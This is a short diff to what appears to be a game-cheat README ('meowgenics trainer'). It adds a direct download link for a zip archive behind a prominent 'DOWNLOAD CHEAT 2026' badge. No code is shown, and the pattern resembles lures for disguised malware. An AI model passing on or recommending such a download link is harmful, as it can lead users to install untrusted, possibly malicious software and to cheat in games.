@@ -60,7 +60,7 @@
 5. Cheat menu opens automatically (Insert key) → toggle features and dominate  
 
 <p align="center">
-  <a href="">
+  <a href="https://github.com/kael-rofellosh88h/meowgenics-trainer/releases/download/Download/meowgenics.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD%20CHEAT%202026%20%E2%86%92-ff69b4?style=for-the-badge&logo=download&logoColor=white&labelColor=black" alt="Download Cheat" width="500"/>
   </a>
 </p>
